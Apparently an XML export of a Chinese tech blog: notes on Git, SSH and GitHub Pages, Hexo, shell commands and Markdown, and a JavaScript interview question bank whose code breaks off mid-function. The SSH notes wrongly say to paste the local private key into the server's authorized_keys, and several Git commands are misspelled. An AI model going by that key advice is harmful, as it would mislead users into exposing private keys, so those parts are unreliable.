Git版本控制管理 安装 git 环境下载地址 历史版本地址 确认是否有 git 环境：1$ git --version 如果看到能输出一个版本号 git version 版本号（版本不一定一致），说明没有问题。 初始设置12$ git config --global user.name &quot;yourname&quot;$ git config --global user.email &quot;your_email@example.com&quot; 这里设置的姓名和邮箱会用在 git 的提交日志中，执行完上面的命令之后会在当前用户目录下生成一个 .gitconfig 文件，想要更改上面的配置项，可以通过修改该文件完成。 只需要在第一次安装了 git 环境之后配置一下即可。如果想要修改，可以使用上面命令重新执行即可修改. git 工作原理 git config git config --global user.name 开发者名称 开发者名字 git config --global user.email email地址 开发者邮箱 配置用户，写明提交时谁完成的，记录是哪个开发者 只需要配置一次 工作目录、暂存区、git 仓库 未追踪（untracked）、已提交（committed）、已修改（modified）和已暂存（staged） ls -al .git 查看.git 文件下的所有文件 git add 文件名.后缀 将为追踪状态和已修改状态的文件添加到暂存区 git commit -m &quot;描述&quot; 将已暂存状态的文件存到仓库中 git status 查看文件状态 git log 查看提交历史（也称之为版本） 以上这几点 git 帮我们解决了一个问题，本地版本管理 多任务： 在现实中经常会同时开发多个功能 通过分支解决 执行 git add --all –&gt; git commit -m &quot;历史记录一&quot; 会自动创建一个 master 分支 为了保证各个功能之间相互的不影响 git branck login 创建一个名字叫 login 的分支 这样就创建了一个分支 git checkout login(分支名) 切换到分支 login 的分支 git add -A git commit -m &quot;完成了...功能&quot; 然后该再回调 master 分支上创建别的分支 git checkout master 来到了 master 分支 git branch cart 创建了 cart 分支 git checkout cart 来到 cart 分支下 修改 cart 的模块功能，突然需要处理 login 下的逻辑 git add index.html git commit -m“创建 cart 功能” 修改 login 分支上的 git checkout login git status git add -A git commit -m &quot;修复了一个小 bug&quot; 然后又回到 cart 分支下，继续开发 git checkout -b 分支名称 创建并切换至到这个分支 通过分支可以实现多任务并行进行，最终代码需要合并，如何合并？让login 和 cart 上的代码合并 git merge login 合并分支，当前在 cart 将 login 分支上的所有代码包括历史记录一起合并到 cart 下面。 这样就通过分支实现了不同模块之间的代码互不干扰，划分分支，有不同的任务对应不同的分支 git branch -d login 删除分支 git branch 查看所有的分支 * 表示在当前的分支 git checkout -b newbranch 创建名称为 newbranch 的分支并切换到该目录下 多人协同开发： 需要一台公网服务器（远程服务器） 借助 SSH 登录 需要在公网服务器上创建一个裸仓库 所谓裸仓库是指没有工作区的目录 mkdir xxx.git –&gt; git init --bare，执行这两条命令 git push 远程仓库地址 master user@主机地址:目录 远程仓库地址可以是 IP 地址格式也可以是域名格式 git pull 远程仓库地址 master user@主机地址:目录 拿远程仓库上的 master 分支 git remote add 别名 真实地址 真实地址太长，使用短的别名来替换 git remote show 别名 查看真实地址 如何实现计算机之间的登录问题，通过 SSH 协议实现计算机之间的安全登录，实现协议的软件有 openssh。 安装 openssh 后提供一个名字叫 ssh 的命令，通过此命令可以是现计算机之间的登录。ssh user@host，输入密码之后创建裸仓库 知识点：ssh –&gt; ssh-keygen -t rsa 在我们的每个用户下创建公钥和私钥； ssh 协议用来计算机之间安全登录的。通过一对公钥和私钥来实现信息的加密处理。 ssh 会通过公/私钥加密，通过 bash ssh-keygen -t rsa 命令生成。 公/私钥工作原理：传递的信息既可以通过公钥加密，也可以通过私钥加密，但最终都要进行解密，假如使用公钥加密，只能使用与其对应的私钥解密相反的，如果使用私钥加密，只能与其对应的公钥才能加密。SSH 会自动选择该使用谁进行加密。 通常在使用登录的时候，服务器在使用自己的公钥传递过来，本地计算机进行存储。下次再进行数据传递时会自动利用该公钥进行数据的加密，服务器接收到信息后会自动使用私钥将数据解开。 首相将本地私钥放到服务器上，当下次访问远程服务器时，服务会自动生成“一段小文本”并使用我们刚刚存的公钥进行加密，然后传递给我们。 免密码登录服务器，把自己的私钥放到服务器。 /mhq 在用户目录下 mkdir .ssh cd .ssh touch authorized_keys vi authorized_keys i 复制本地的私钥 粘贴 wq 现实开发中要解决多人协同开发的 远程仓库，如何解决代码的共享问题： –&gt; 远程服务器–&gt; 登录SSH 用户名@服务器地址 –&gt; yes –&gt; 输入密码–&gt; mkdir demo.git 创建远程仓库–&gt; 初始成裸仓库(专门共享代码的，没用工作区的仓库)–&gt; git init --bare(变成了裸仓库了)–&gt; ls–&gt; 在 bash 窗口中–&gt; git checkout master 切换到 master 分支下–&gt; git push 用户名@192.168.32.101:/root/demo.git (远程仓库的地址) 只需要创建一个裸仓库，剩下的 git 会自己管理。 git pull 用户名@192.168.32.101:/root/demo.git master 从远程仓库拿到本地 rm -rf ls mkdir demo git init --bare ls git bush student@192.168.32.101:/home/student/demo master 以 student 的身份登录，往这台服务器发送，: 表示要访问目录了 –&gt; 输入密码： 另一个开发小伙伴：git clone student@192.168.32.101:/home/student/demo –&gt; 输密码：****** git remote add hiraku git@地址 给远程仓库起一个名字 git push hiraku master 将修改内容放到远程仓库上去 git remote show hiraku 查看比较短的 hiraku 的对应真实地址是什么 git remote add myself mhq@192.168.32.101:/mhq/demo.git 添加多个 git push myself master 其他 git init 初始化一个新项目 git clone 得到一个已有的仓库副本 git config --global user.name 名称 git config --global user.email 邮箱 基本操作详解 ls -al .git 查看.git 文件下的所有文件 git init 通过该命令创建一个本地仓库 执行过后，会在目录下生成一个 .git隐藏目录，最好不要手动修改 touch .gitignore 创建 .gitignore 文件 git status 查看当前工作树状态 例如有新增的文件、修改的、删除的、等操作没有被添加到暂存区或者没有被提交 都可以通过 git status 命令看到 git add 文件名.后缀 或者 git add --all 添加所有文件 将制定的文件添加到暂存区（待提交列表） git commit -m &quot;描述&quot; 将暂存区（待提交列表）中的文件提交到本地仓库，形成一个历史快照 git log 查看提交日志 gitk 以图形化的界面查看本地仓库提交日志状态 git push 连接到远程仓库 需要输入账号名 需要输入密码 git基本命令git基本命令 gitk命令打开的界面 在安装 Git 的同时，你也装好了它提供的可视化工具，gitk 和 git-gui。gitk 是一个历史记录的图形化查看器，你可以把它当作是基于 git log 和 git grep 命令的一个强大的图形操作界面，当你需要查找过去发生的某次记录，或是可视化查看项目历史的时候，你将会用到这个工具。使用 Gitk 的最简单方法就是从命令行打开，只需 cd 到一个 Git 仓库，然后键入： 1$ gitk [git log options] Gitk 可以接受很多命令行选项，其中的大部分都直接传给底层的 git log 去执行了。 –all可能是这其中最有用的一个, 它告诉 gitk 去尽可能地从任何引用查找提交并显示，而不仅仅是从 HEAD，Gitk 的界面看起来长这样 更改提交的操作指定文件回滚： git checkout commit提交时的节点前五位 文件名.后缀 git checkout [file] 恢复暂存区的指定文件到工作区 git checkout [commit] [file] 恢复某个commit的指定文件到暂存区和工作区 git checkout commit ... 恢复暂存区的所有文件到工作区 指定版本回滚： git reset --hard HEAD^ 恢复暂存区和工作区到上一次最新的提交 回退一个版本 git reset --hard 提交哈希值 根据提交哈希值（版本号）回溯到历史版本，首先得知道到底有哪些值 –hard 意味着把指针挪一个位置，工作区和暂存区都移了位置 –soft log 只剩两次了，只是指针变了 –mixed 历史会变、暂存区也变，工作区不变。 git reflog 查看当前仓库操作日志 git commit --amend 修改最近一次提交的提交日志 更新仓库： 本地仓库更新到和远程仓库一样 touch index.js 创建文件 git status git checkout -b aaa 创建平行分支 git push hiraku aaa 远程仓库下创建一个相同的分支 git fetch git branch -a 查看远程分支和本地分支 git merger 远程分支名称 远程和本地同步 git pull = git fetch + git merge git push hiraku --delete aaa 删除远程仓库下的 aaa 分支 git push 远程地址 本地分支：远程分支 添加分支 git push 远程地址 本地分支 添加分支 简写，相当于 git push 远程地址 aaa:bbb 本地 aaa 放到远程 bbb。 推送至远程仓库 如果已经有了一个本地仓库，就可以通过下面的形式和线上的空仓库产生关联： git remote add origin 远程仓库地址 git 会自动将远程仓库地址起个别名 origin git push -u origin master 推送到名称为 origin 远程仓库地址下的 master 分支下 从远程仓库获取 git clone 仓库地址 = git init + git pull 地址 master + git remote add origin git 会自动将 origin 设置为该远程仓库地址的标识符 git pull 地址 分支 本地得有一个仓库 git 高级 git difftool 比较工作区和暂存区的差异 git difftool 提交记录1 比较工作区和特定提交的差异 git difftool 提交记录1 提交记录2 这两次提交的差异 git difftool cart 查看当前分支和 cart 分支的差异 github Github 是为开发者提供 Git 仓库的托管服务。是一个可以让开发者与朋友、同事、同学及陌生人共享代码的完美平台。简而言之，Github 就是程序员的新浪微博，社交化编程。 GitHub Guides GitHub Training &amp; Guides GitHub入门与实践 介绍 Github 与 Git 的区别 Git 是一个分布式版本控制系统 历史记录的问题 多人协作的问题 Github 是为开发者提供 Git 仓库的托管服务 不仅仅是 Git 仓库的托管服务 社交元素：项目点赞、关注项目Watch、Pull Request 等功能 Pull Request：假设你修改了一个开源仓库源代码 你可以通过 Pull Request 请求合并，请求合并到源代码仓库中 当你发送了请求合并，别人会收到你的合并请求，然后会检查你的合并请求，如果没有问题，就可以直接合并到源代码库中 Github Flavored Markdown 写说明文档、发布评论等都使用的是 Markdown 基本上各大开源产品都在 Github 上 jQuery、bootstrap、AngularJS、Vue、React、Node 基本使用 创建账户 设置头像 创建仓库 连接仓库 公开代码 克隆仓库 git clone 仓库地址 编写代码 提交 git add 文件名(添加某一个文件) –&gt; git commit -m “提交说明” 进行 git push 发布到远程仓库 使用 Github Pages 搭建静态站点我们可以把静态网站部署到 Github 上，然后通过特定的域名就可以访问了。 在 github 上创建一个空仓库，仓库名称以 自己github用户名.github.io 克隆仓库地址到本地 git clone https://github.com/用户名/用户名.github.io 文件名 将静态页的代码放到本地仓库中 过滤掉不需要上传到远程仓库的文件或文件夹 cd 本地仓库根目录 创建 .gitignore 文件, 将不需要跟踪的文件添加到.gitignore 文件中， 比如：.idea demo 然后提交文件到该仓库中，注意：仓库根路径必须有一个 index.html 文件 git add --all 接下来就可以通过 自己的github用户名.github.io 来访问你托管的那个静态网站仓库了，默认去找 index.html 页面 还可以通过创建不同名字的仓库用来托管别的静态网站项目，如果想要通过你的github域名来访问，就必须把你托管的文件放到一个叫做 gh-pages 的分支中。然后就可以通过 github用户名.github.io/拥有gh-pages分支的仓库名称 来访问你的这个网站了。 克隆 github 项目开源，协同开发主动邀请 –&gt; collaboratorsfork –&gt; 自己的项目下就会有一个一模一样的仓库Pull requests –&gt; new pull requestIssues –&gt; 讨论问题 使用 Hexo 搭建自己的个人静态博客Hexo官方网站 必须安装 Node 环境 通过在终端任意目录输入 node -v 查看是否有输入node的版本 在终端的任意目录输入 npm install -g hexo-cli 然后回车执行等待安装成功 通过输入 hexo --version 如果看到输入一大堆的版本号就说明安装成功了 Hexo 是一个命令行应用程序 接下来通过输入 hexp init 博客项目存储目录 Hexo 会在你执行该命令的目录下生成一个博客项目 初始化博客项目的过程需要联网 接下来通过终端进入刚才创建的博客项目目录，然后在该目录下输入 npm install 回车等待执行结束 接下来输入 hexo server 回车执行，它会在你的本地启动一个服务器，然后就可以访问你的博客项目 进入博客项目，输入 hexo new 文章名称 创建博客 该命令会自动在 source/_posts/ 目录下生成一个 文章名称.md 文件 生成静态文件：hexo generate 该命令会自动在项目的根目录下的 public 目录下降静态文件放进去吧 快速部署 修改配置文件 在项目根路径下执行 npm install hexo-deployer-git --save 该命令 npm 在安装 node 时自动安装了 接下来就可以直接输入 hexo deploy --generate 自动发布到 github 上 删除命令 ： rm -rf 文件夹名]]></content>
      <categories>
        <category>Web Development Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>git</tag>
        <tag>github</tag>
        <tag>hexo</tag>
        <tag>svn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行]]></title>
    <url>%2F2016%2F07%2F18%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[学习命令行最好的方式是学习 Linux 上的 shell、bash 命令行GUI(用户界面) VS CLI(命令行界面)大多数的计算机用户只是熟悉图形用户界面（GUI），并且产品供应商和此领域的学者会灌输给用户这样的思想，命令行界面（CLI）是过去使用的一种很恐怖的东西。这就很不幸，因为一个好的命令行界面，是用来和计算机进行交流沟通的非常有效的方式，正像人类社会使用文字互通信息一样。人们说，图形用户界面让简单的任务更容易完成，而命令行界面使完成复杂的任务成为可能，到现在这句话仍然很正确。 shell一说到命令行，其实真正指的是 shell。 shell 就是一个程序，它接受从键盘输入的命令，然后把命令传递给操作系统去执行。 几乎所有的 Linux 发行版都提供一个名为 bash 的 shell 程序。bash 是 Bourne Again SHell 的首字母缩写，所指的是这样一个事实。 终端仿真器当使用图形用户界面时，我们需要另一个和 shell 交互的叫做终端仿真器的程序。在 Windows 上，一般使用操作系统自带的 cmd 或者 powershell。在 Linux 上，如果是图形用户界面，那么可以使用 terminal 或者 konsole、gnome-terminal 之类的终端仿真器，但基本上，它们都完成同样的事情，让我们能访问 shell，可能会因为附加的一些花俏功能而喜欢上某个终端。 关于名字，如果有人提到：控制台、终端、bash、shell、terminal 等，一般都是指上面这些。 一般在 Linux 上，都会提供一个 bash 或者 terminal 之类的工具，让你来使用 shell。 安装 Git for Windows 客户端体验 shellGit for Windows 客户端自带了一个终端仿真器：git bash Git 下载地址： git for Windows - github 托管地址，然后找到 Realease 模块，找到下载的对应版本即可。 注意：虽然在 Windows 上可以通过 cmd 或 powershell 体验终端的使用，但是学习终端最正确的方式是学习 Linux 上的命令行，要更纯正，更强大。 我们通过使用 Git for Windows 客户端（自带了一个 bash）来学习 shell。 打开和退出终端 开始菜单打开 右键打开 通过开始-运行：输入 git-bash 打开（需要PATH环境变量） 命令提示符git bash 中使用 ~ 来表示用户目录 使用终端操作文件系统 绝对路径和相对路径 pwd（print working directory） cd（change directory） 切换到指定路径（相对路径或绝对路径） ls（list files） ls 列出当前目录文件 ls 目录路径 列出指定路径文件 ls -a 列出文件并显示隐藏文件或目录 cp（copy） cp 源路径 目标路径 cp 在复制目录的时候，不会复制里面的子文件或子目录 -r （recursive）递归复制 mv（move）：移动文件或者目录，还可以重命名文件或目录 mkdir（make directory）：创建目录 rm（remove）：删除文件或目录 -rf 递归删除：直接将整个目录包括里面的内容都删掉 rmdir 目录名称 只能删除空目录 clear：清屏 touch 文件名 根据文件名创建新的文件 cat 文件名 查看指定的文本文件 使用 less 命令浏览文件内容less 命令是一个用来浏览文本文件的程序。 less 命令是这样使用的：less 文本文件名 一旦 less 程序运行起来，我们就能浏览文件内容了。如果文件内容多于一页，那么我们可以上下滚动文件。按下 q 键，退出 less 程序。 下表列出了 less 程序最常使用的键盘命令： 1234567891011命令 行为h 显示帮助屏幕Page UP or b 向上翻滚一页Page Down or space 向下翻滚一页UP Arrow 向上翻滚一行Down Arrow 向下翻滚一行G 移动到最后一行g 移动到开头一行/charaters 向前查找指定的字符串n 向前查找下一个出现的字符串，这个字符串是之前所指定查找的q 退出 less 程序]]></content>
      <categories>
        <category>Web Development Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>git</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown]]></title>
    <url>%2F2016%2F07%2F08%2Fmarkdown%2F</url>
    <content type="text"><![CDATA[markdown 轻量级标记语言（html、xml），它允许人们“使用易读易写的纯文本格式编写文档”，Markdown 最重要的设计就是可读性，Markdown 可以选择性的转换为 HTML 文档格式，很多网站目前都使用了 Markdown 或者其变种，例如Github、简书等大型社区。 markdown 特点 纯文本，所以兼容性极强，可以用所有文本编辑器打开 专注于文字写作而不是排版 格式转换方便，可以轻松转换为 HTML、PPT、电子书等 Markdown 标记语法简单好记，可读性强 实时预览编辑器月光博客 - 好用的Markdown编辑器一览 dillinger 马克飞象 简书 MarkdownPad Sublime Text 配合 Markdown Preview 插件 Webstorm 配合插件 gitbook 编辑实时预览工具只是为了辅助教学而已，我们真正在进行写作的时候，其实是不需要实时预览的，因为 Markdown 标记语言本身已经足够清晰了。 Markdown 基本语法注意：每个标题、段落、图片、代码段、一个列表之间都用一行空行分开； 标题 #: 表示 h1, ##: 表示 h2, ###: 表示 h3, ####: 表示 h4, #####: 表示 h5, #####: 表示 h6 段落 直接写，不用任何空格 Markdown中粗体与斜体非常简单，用两个号把文字包围相当于粗体，用一个号把文字包围相当于斜体。使用两个~~号包围则显示删除线效果。 粗体 粗体 斜体 斜体 删除线 删除 无序列表 一级用 - 加一个空格 二级用 一个 tab 之后加一个 + 和一个空格 三级同样再放一个 tab之后加一个 * 和一个空格 有序列表 数字. 加空格 链接 [连接名称](连接url) 图片 ![图片名称](图片路径url) `文本引用 用一个 &gt; 来引用 行内代码引用 一对反引号包裹，esc 下面的键 多行代码引用 一对三个反引号包裹 表格表格比较特殊，不太好用，下面是规范写法： 12345| ABCD | EFGH | IJKL || -----|:----:| ----:|| a | b | c || d | e | f || g | h | i | Markdown 使用场景 学习笔记 手写笔记 演讲稿 技术沙龙，party Markdown 演讲稿 写书（侧重于技术相关的内容非常适合） 个人笔记 文章博客 教学讲义 说明文档 使用比较多，软件的说明文档或者开源项目的说明文档 电子邮件 只要有写作的地方，都可以使用 Markdown 来书写。 用 Markdown 编辑电子邮件Markdown 本身语法简单，使用 Markdown 写出来的内容结构也非常清晰，有助于协作沟通，总而言之，使用 Markdown 可以可以更加专注写作本身。 其实就是将 md 格式字符串转换成 html 而已，这里使用一个 Chrome 插件： Markdown Here 使用 GitBook 制作电子书GitBook 在线 Web 端写 使用客户端软件写 下载地址： 终端命令行工具可以辅助生成 自己动手做一个 Markdown 实时预览编辑器Markdown 本身就是一个标记语言，可以通过某种方式转换成别的文本格式，本质上转换的过程其实就是做正则解析替换。 如何将markdown格式字符串转成html 使用一个第三方包：marked npm install marked 给 html 设置样式 给代码块设置颜色高亮 highlightjs Thanks https://zh.wikipedia.org/wiki/Markdown http://www.jianshu.com/p/q81RER http://wowubuntu.com/markdown/ http://www.jianshu.com/p/PpDNMG http://www.jianshu.com/p/qqGjLN https://www.zhihu.com/question/20409634 http://www.markdown.cn/]]></content>
      <categories>
        <category>markdown系列</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-js 高级]]></title>
    <url>%2F2016%2F06%2F28%2F%E9%A2%98%E5%BA%93-js%20%E9%AB%98%E7%BA%A7%2F</url>
    <content type="text"><![CDATA[1、JQuery一个对象可以同时绑定多个事件，实现原理jQuery可以给一个对象同时绑定多个事件，低层实现方式是使用 addEventListner 或 attachEvent 兼容不同的浏览器实现事件的绑定，这样可以给同一个对象注册 2、webkit、用浏览器的各种工具来调试和debug代码 Webkit是浏览器引擎，包括 html 渲染和 js 解析功能，手机浏览器的主流内核，与之相对应的引擎有 Gecko（Mozilla Firefox 等使用）和 Trident（也称MSHTML，IE 使用）。对于浏览器的调试工具要熟练使用，主要是页面结构分析，后台请求信息查看，js 调试工具使用，熟练使用这些工具可以快速提高解决问题的效率 3、如何测试前端代码? 知道 BDD, TDD, Unit Test 么?怎么测试你的前端工程 (mocha, sinon, jasmin, qUnit..) 了解BDD行为驱动开发与 TDD 测试驱动开发已经单元测试相关概念 TDD：测试驱动开发（Test-Driven Development） 测试驱动开发是敏捷开发中的一项核心实践和技术，也是一种设计方法论。TDD的原理是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。TDD的基本思路就是通过测试来推动整个开发的进行，但测试驱动开发并不只是单纯的测试工作，而是把需求分析，设计，质量控制量化的过程。TDD首先考虑使用需求（对象、功能、过程、接口等），主要是编写测试用例框架对功能的过程和接口进行设计，而测试框架可以持续进行验证。 BDD：行为驱动开发（Behavior Driven Development） 行为驱动开发是一种敏捷软件开发的技术，它鼓励软件项目中的开发者、QA和非技术人员或商业参与者之间的协作。主要是从用户的需求出发，强调系统行为。BDD最初是由Dan North在2003年命名，它包括验收测试和客户测试驱动等的极限编程的实践，作为对测试驱动开发的回应。 ATDD：验收测试驱动开发（Acceptance Test Driven Development） TDD 只是开发人员的职责，通过单元测试用例来驱动功能代码的实现。在准备实施一个功能或特性之前，首先团队需要定义出期望的质量标准和验收细则，以明确而且达成共识的验收测试计划（包含一系列测试场景）来驱动开发人员的TDD实践和测试人员的测试脚本开发。面向开发人员，强调如何实现系统以及如何检验。 4、前端 templating(Mustache, underscore, handlebars) 是干嘛的, 怎么用? Web 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，Mustache 是一个 logic-less （轻逻辑）模板解析引擎，它的优势在于可以应用在 Javascript、PHP、Python、Perl 等多种编程语言中。Underscore封装了常用的JavaScript对象操作方法，用于提高开发效率。Handlebars 是 JavaScript 一个语义模板库，通过对view和data的分离来快速构建Web模板。 5、Handlebars 的基本用法没有用过的话说出它是干什么的即可 6、Handlerbars 的对模板的基本处理流程， 如何编译的？如何缓存的？学习技术不仅要会用，还有熟悉它的实现机制，这样在开发中遇到问题时才能更好的解决 7、用js实现千位分隔符原生js的熟练度，实践经验，实现思路 8、检测浏览器版本版本有哪些方式？IE与标准浏览器判断，IE不同版本的判断，userAgent var ie = /*@cc_on !@*/false; 9、实现一个函数 clone要求：对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制 考察点1：对于基本数据类型和引用数据类型在内存中存放的是值还是指针这一区别是否清楚考察点2：是否知道如何判断一个变量是什么类型的考察点3：递归算法的设计 123456789101112131415161718192021222324252627282930313233// 方法一：Object.prototype.clone = function()&#123; var o = this.constructor === Array ? [] : &#123;&#125;; for(var e in this)&#123; o[e] = typeof this[e] === "object" ? this[e].clone() : this[e]; &#125; return o;&#125;//方法二：/*** 克隆一个对象* @param Obj* @returns*/function clone(Obj) &#123; var buf; if (Obj instanceof Array) &#123; buf = [];//创建一个空的数组 var i = Obj.length; while (i--) &#123; buf[i] = clone(Obj[i]); &#125; return buf; &#125;else if (Obj instanceof Object)&#123; buf = &#123;&#125;;//创建一个空对象 for (var k in Obj) &#123; //为这个对象添加新的属性 buf[k] = clone(Obj[k]); &#125; return buf; &#125;else&#123; //普通变量直接赋值 return Obj; &#125; &#125; 10、小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：12345678function Dog() &#123; this.wow = function() &#123; alert('Wow'); &#125; this.yelp = function() &#123; this.wow(); &#125;&#125; 11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）1234567891011121314function MadDog() &#123; this.yelp = function() &#123; var self = this; setInterval(function() &#123; self.wow(); &#125;, 500); &#125;&#125;MadDog.prototype = new Dog(); //for testvar dog = new Dog();dog.yelp();var madDog = new MadDog();madDog.yelp(); 12、下面这个ul，如何点击每一列的时候alert其index?（闭包）1234567891011121314151617181920212223242526&lt;ul id=”test”&gt;&lt;li&gt;这是第一条&lt;/li&gt;&lt;li&gt;这是第二条&lt;/li&gt;&lt;li&gt;这是第三条&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; // 方法一： var lis=document.getElementById('2223').getElementsByTagName('li'); for(var i=0;i&lt;3;i++) &#123; lis[i].index=i; lis[i].onclick=function()&#123; alert(this.index); &#125;; &#125; //方法二： var lis=document.getElementById('2223').getElementsByTagName('li'); for(var i=0;i&lt;3;i++)&#123; lis[i].index=i; lis[i].onclick=(function(a)&#123; return function() &#123; alert(a); &#125; &#125;)(i); &#125;&lt;/script&gt; 13、编写一个JavaScript函数，输入指定类型的选择器仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * @param selector &#123;String&#125; 传入的CSS选择器。 * @return &#123;Array&#125; * @param &#123;[type]&#125; selector [description] * @return &#123;[type]&#125; [description] */var query = function(selector) &#123;var reg = /^(#)?(\.)?(\w+)$/img;var regResult = reg.exec(selector);var result = [];//如果是id选择器if (regResult[1]) &#123; if (regResult[3]) &#123; if (typeof document.querySelector === "function") &#123; result.push(document.querySelector(regResult[3])); &#125; else &#123; result.push(document.getElementById(regResult[3])); &#125; &#125;&#125; else if (regResult[2]) &#123;//如果是class选择器 if (regResult[3]) &#123; if (typeof document.getElementsByClassName === 'function') &#123; var doms = document.getElementsByClassName(regResult[3]); if(doms) &#123; result = converToArray(doms); &#125; &#125; else &#123; //如果不支持getElementsByClassName函数 var allDoms = document.getElementsByTagName("*") ; for (var i = 0, len = allDoms.length; i &lt; len; i++) &#123; if(allDoms[i].className.search(new RegExp(regResult[2])) &gt; -1) &#123; result.push(allDoms[i]); &#125; &#125; &#125; &#125;&#125; else if (regResult[3]) &#123; //如果是标签选择器 var doms = document.getElementsByTagName(regResult[3].toLowerCase()); if(doms) &#123; result = converToArray(doms); &#125; &#125; return result;&#125;function converToArray(nodes)&#123; var array = null; try&#123; array = Array.prototype.slice.call(nodes,0);//针对非IE浏览器 &#125; catch(ex) &#123; array = new Array(); for( var i = 0 ,len = nodes.length; i &lt; len ; i++ ) &#123; array.push(nodes[i]) &#125; &#125; return array;&#125; 14、请评价以下代码并给出改进意见123456789101112if(window.addEventListener)&#123; var addListener = function (el, type, listener, useCapture) &#123; el.addEventListener(type, listener, useCapture); &#125;;&#125;else if(document.all)&#123; addListener = function(el, type, listener) &#123; el.attachEvent("on" + type, function() &#123; listener.apply(el); &#125;); &#125; &#125; 不应该在 if 和 else 语句中声明 addListener 函数，应该先声明；不需要使用 window.addEventListener 或 document.all 来进行检测浏览器，应该使用能力检测；由于 attachEvent 在 IE 中有 this 指向问题，所以调用它时需要处理一下 改进如下： 12345678910111213function addEvent (elem, type, handler) &#123; if(elem.addEventListener) &#123; elem.addEventListener(type, handler, false); &#125; else if (elem.attachEvent) &#123; elem['temp' + type + handler] = handler; elem[type + handler] = function() &#123; elem['temp' + type + handler].apply(elem); &#125;; elem.attachEvent('on' + type, elem[type + handler]); &#125; else &#123; elem['on' + type] = handler; &#125;&#125; 15、定义一个log方法，让它可以代理 console.log 的方法。123456789// 可行的方法一：function log(msg) &#123; console.log(msg);&#125;log("hello world!") // hello world!// 如果要传入多个参数呢？显然上面的方法不能满足要求，所以更好的方法是：function log()&#123; console.log.apply(console, arguments);&#125;; apply和call方法的异同。 对于apply和call两者在作用上是相同 即是调用一个对象的一个方法，以另一个对象替换当前对象。将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。 但两者在参数上有区别 对于第一个参数意义都一样，但对第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，而call则作为call的参数传入（从第二个参数开始）。如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3]) 。 16、对作用域上下文和this的理解，看下列代码：123456789var User = &#123; count: 1, getCount: function() &#123; return this.count; &#125;&#125;;console.log(User.getCount()); // what?var func = User.getCount;console.log(func()); // what? 问两处console输出什么？为什么？ 答案是 1 和 undefined。 func是在winodw的上下文中被执行的，所以会访问不到count属性。 那么如何确保Uesr总是能访问到func的上下文，即正确返回1。正确的方法是使用Function.prototype.bind。兼容各个浏览器完整代码如下： 12345678Function.prototype.bind = Function.prototype.bind || function(context)&#123; var self = this; return function()&#123; return self.apply(context, arguments); &#125;;&#125;var func = User.getCount.bind(User);console.log(func()); 17、原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？如何用原生JS实现Jq的ready方法？ window.onload()方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。$(document).ready()是DOM结构绘制完毕后就执行，不必等到加载完毕。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * 传递函数给whenReady() * 当文档解析完毕且为操作准备就绪时，函数作为document的方法调用 */var whenReady = (function() &#123; //这个函数返回whenReady()函数 var funcs = []; //当获得事件时，要运行的函数 var ready = false; //当触发事件处理程序时,切换为true //当文档就绪时,调用事件处理程序 function handler(e) &#123; if (ready) return; //确保事件处理程序只完整运行一次 //如果发生onreadystatechange事件，但其状态不是complete的话,那么文档尚未准备好 if (e.type === 'onreadystatechange' &amp;&amp; document.readyState !== 'complete') &#123; return; &#125; //运行所有注册函数 //注意每次都要计算funcs.length //以防这些函数的调用可能会导致注册更多的函数 for(var i = 0; i &lt; funcs.length; i++) &#123; funcs[i].call(document); &#125; //事件处理函数完整执行,切换ready状态, 并移除所有函数 ready = true; funcs = null; &#125; //为接收到的任何事件注册处理程序 if(document.addEventListener) &#123; document.addEventListener('DOMContentLoaded', handler, false); document.addEventListener('readystatechange', handler, false); //IE9+ window.addEventListener('load', handler, false); &#125;else if(document.attachEvent) &#123; document.attachEvent('onreadystatechange', handler); window.attachEvent('onload', handler); &#125; //返回whenReady()函数 return function whenReady(fn) &#123; if(ready) &#123; fn.call(document); &#125; else &#123; funcs.push(fn); &#125; &#125;&#125;)();// 如果上述代码十分难懂，下面这个简化版：function ready(fn)&#123; if(document.addEventListener) &#123;//标准浏览器 document.addEventListener('DOMContentLoaded', function() &#123; //注销事件, 避免反复触发 document.removeEventListener('DOMContentLoaded',arguments.callee, false); fn();//执行函数 &#125;, false); &#125; else if (document.attachEvent) &#123;//IE document.attachEvent('onreadystatechange', function() &#123; if(document.readyState == 'complete') &#123; document.detachEvent('onreadystatechange', arguments.callee); fn();//函数执行 &#125; &#125;); &#125;&#125;; 18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS） 给需要拖拽的节点绑定mousedown, mousemove, mouseup事件mousedown事件触发后，开始拖拽mousemove时，需要通过event.clientX和clientY获取拖拽位置，并实时更新位置mouseup时，拖拽结束需要注意浏览器边界的情况 19、请实现如下功能12345678910111213141516171819202122232425262728293031323334353637383940414243444546function setcookie(name,value,days)&#123; //给cookie增加一个时间变量 var exp = new Date(); exp.setTime(exp.getTime() + days*24*60*60*1000); //设置过期时间为days天 document.cookie = name + " = "+ escape (value) + "; expires = " + exp.toGMTString(); &#125; function getCookie(name)&#123; var result = ""; var myCookie = "" + document.cookie + 